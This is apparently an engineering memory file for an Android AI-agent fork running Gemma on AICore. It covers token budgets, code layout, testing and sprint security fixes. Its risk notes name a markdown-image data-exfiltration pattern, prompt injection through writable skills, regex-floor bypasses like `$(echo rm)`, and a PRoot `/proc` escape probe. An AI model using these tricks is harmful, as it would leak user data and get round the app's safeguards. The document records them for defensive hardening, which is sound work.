# Agent project memory — RikkaHub on Vivo X300 / AICore / Gemma 4 E4B

Central memory for this fork. Keep it short; update after each sprint.
Tags: [CONFIRMED] [PROBABLE] [HYPOTHESIS] [FALSIFIED] [MITIGATED] [REQUIRES VIVO VALIDATION]

## Goal
Local agent on Vivo X300 (12 GB, Dimensity 9500): RikkaHub → AICore (ML Kit Prompt API)
→ Gemma 4 E4B (`nano-full` + PREVIEW) → GenerationLoop → tools. AICore stays the primary runtime.

## Hard facts about the runtime (source: ML Kit docs via search, 2026-09)
- Prompt API input limit: **< 4000 tokens**, system prefix included. Gemma 4 E4B's own
  128K window does NOT apply through AICore. [CONFIRMED doc] [REQUIRES VIVO VALIDATION]
- `maxOutputTokens` range 1..256, default 256. "Raise MAX_TOKENS" is impossible at the API. [CONFIRMED doc]
- `Candidate.finishReason` is an Int (`STOP` / `MAX_TOKENS` / `OTHER`), null mid-stream.
- `GenerativeModel.countTokens()` + `getTokenLimit()` exist — not used yet (signatures unverified).
- No native tool calling: tools go through the `<tool_call>{json}</tool_call>` text protocol.

## Where things are
- AICore provider (Android/ML Kit glue): `ai/.../providers/AICoreProvider.kt`
- AICore pure logic (budget, tool list, parser, continuation): `ai/.../providers/AICorePrompt.kt`
- Agent loop: `app/.../data/ai/GenerationLoop.kt` (maxSteps, wall-clock cap, LoopGuard on
  identical calls, replay safety for interrupted tools, approval states). Reads no finishReason.
- Approval policy: `app/.../data/ai/tools/ToolApprovalDefaults.kt`; workspace tools: `WorkspaceTools.kt`
- Floors (runtime, model-independent): `PathSafetyGuard.kt`, `HardlineCommandGuard.kt`,
  `data/ai/net/GuardedDns.kt` (SSRF), `workspace/.../WorkspaceFileSystem.kt` (confinement)

## Testing without Android build
Google Maven (dl.google.com) is blocked in the cloud sandbox → no AGP/Gradle build there.
`scripts/host-test/run.sh` compiles the Android-free sources with a standalone kotlinc and runs
98 JUnit tests + a scenario driver that runs the real `AICoreProvider.streamText` against a
scripted **fake** ML Kit (`scripts/host-test/stubs`, shape only, not the real AAR).
On a dev machine the same JUnit tests run with `./gradlew :ai:testDebugUnitTest :workspace:testDebugUnitTest :app:testDebugUnitTest`.
The repo has no CI.

## Android build (details: BUILD_ANDROID.md) — NOT yet performed anywhere
`:app`, variant debug, `git submodule update --init --recursive && ./gradlew :app:assembleDebug`
→ `app/build/outputs/apk/debug/app-arm64-v8a-debug.apk` (package `excp.rikkahub.debug`).
Gradle 9.5.0, AGP 9.3.1, Kotlin 2.4.10, compileSdk/targetSdk 37, minSdk 26, Java target 17,
JDK ≥ 17. SDK: platforms;android-37, cmake;3.22.1, default NDK. Also bun + pnpm + Node
(`:web` preBuild). Both git submodules are uninitialized in a fresh clone.

## Sprint 1 (2026-09-25) — findings and fixes
AICore / context
- [CONFIRMED→MITIGATED] Every tool-loop step is appended to the same assistant message, so the
  6-message window never trimmed a running task: 5×6 KB tool results → 30.6k-char prompt.
  Now token-budgeted (90% of 4000, ~3 chars/token, CJK = 1): task message pinned, newest tool
  result 2400 ch head+tail, older 400 ch, oldest steps dropped with a marker.
- [CONFIRMED→MITIGATED] Tool list: now ≤40% of budget, shows arg names (`name(a*, b)`),
  ranks used/task-relevant tools first. Hidden tools still execute if called.
- [CONFIRMED→MITIGATED] finishReason forwarded as "0"/"1". MAX_TOKENS → up to 2 continuation
  rounds (prefill = generated text, one parser across rounds, joiner drops restart/overlap),
  never after a tool call. Finish = stop / length / tool_calls.
- [CONFIRMED→MITIGATED] Last ≤10 chars lost when the final chunk carries text; Stop reported
  as "AICore error"; non-streaming mode dropped all tool calls; unclosed tool call surfaced as
  raw text without the tag.
- [MITIGATED] Tool output could forge `user:` turns / tool tags in the flat transcript.
- One retry at 60% budget on an input-overflow error before any output (error text heuristic).
Security
- [CONFIRMED→MITIGATED] `deleteRecursively` follows symlinks: workspace delete/move wiped the
  link target outside the root; tree() listed outside files. `deleteRecursivelyNoFollow` everywhere
  agent/shell-reachable.
- [CONFIRMED→MITIGATED] PathSafetyGuard: /data/data rule dead on device (canonical /data/user/0);
  own secrets (datastore, databases, shared_prefs, no_backup, app_webview, known_hosts) were reachable.
- [CONFIRMED→MITIGATED] telegram_send_* / ssh_upload / ssh_download bypassed PathSafetyGuard.
- [CONFIRMED→MITIGATED] browser_open: ungated egress (URL carries data) + LAN/loopback reachable.
- [CONFIRMED→MITIGATED] Hardline floor let `rm -rf /sdcard` (and DCIM, …) through.

## Open risks (not fixed — need a decision or a device)
- [CONFIRMED] Markdown images in model output auto-load any URL → approval-free exfil
  (`![](https://x/?d=…)`). Fix = click-to-load remote images in assistant messages (UX decision).
- [CONFIRMED] PRoot binds `/upload` (all chat attachments) and a writable `/skills` into the shell:
  the model can read every upload and persistently rewrite its own skills (prompt injection).
- [HYPOTHESIS] PRoot is not a sandbox: with /proc bound, `/proc/<pid>/root` or `/proc/<pid>/cwd`
  may reach the host FS (app-private data). Test on device: `ls /proc/$PPID/root/data/user/0/`.
- [CONFIRMED] Hardline is regex-only (`r''m`, `$(echo rm)`, python rmtree pass) — by design;
  approval is the control. "Always Allow" on termux/workspace_shell removes it.
- [CONFIRMED] WebView redirects to private IPs are not checked (own network stack).
- [PROBABLE] Prompt rule "NEVER call a verification tool" (tuned for Nano loops) conflicts with
  verify-after-act; left unchanged until E4B behaviour is measured on the Vivo.
- MCP tools: always approval-gated; no per-server egress policy.

## Vivo validation checklist (nothing below is device-tested yet)
1. Build: `./gradlew :app:assembleDebug` — first real compile of this sprint's app/ai changes
   (only risk flagged: `Candidate.FinishReason.MAX_TOKENS` symbol, verified on docs only).
2. `adb logcat -s AICoreProvider` → `prompt round=N est=…tok prefix=…ch tools=a/b dropped=…`.
   Compare `est` with `countTokens` if possible; tune `AICORE_INPUT_TOKEN_BUDGET` / chars-per-token.
3. Long answer (> 256 tokens): check the continuation joins cleanly (no repeated text).
4. `write_file` with ~1 KB content: tool call cut at 256 tokens must complete in round 2.
5. 6+ step tool task: task still solved; no ErrorCode/overflow; note latency per round.
6. Overflow: paste ~15 KB text; expect one retry log, not a crash. Record the real error text.
7. Security: `ln -s /data/user/0/<pkg>/databases /workspace/x/l; delete x` → databases intact.

## Next steps (priority order)
1. Build + Vivo checklist above; record results here.
2. Use `countTokens`/`getTokenLimit` for exact budgeting once the API is checked against the AAR.
3. Click-to-load for remote markdown images (egress).
4. Measure E4B tool-call accuracy with arg names vs without; decide on the "never verify" rule.
5. Persistent task state for AICore (goal + done steps + last result) so a dropped history
   still carries progress — only if step 5 of the checklist shows the model losing track.
6. Check upstream ExTV/rikkahub-agent and rikkahub/rikkahub for new commits (this fork was
   level with ExTV on 2026-09-24).
